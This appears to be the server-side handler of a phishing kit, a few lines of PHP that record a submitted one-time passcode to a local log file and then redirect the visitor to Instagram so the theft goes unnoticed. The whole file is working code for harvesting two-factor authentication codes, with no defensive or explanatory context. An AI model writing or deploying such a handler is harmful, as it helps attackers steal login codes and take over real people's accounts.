<?php
file_put_contents("log.txt", "[OTP] Code: " . $_POST['otp'] . "\n", FILE_APPEND);
header("Location: https://instagram.com");
exit();
?>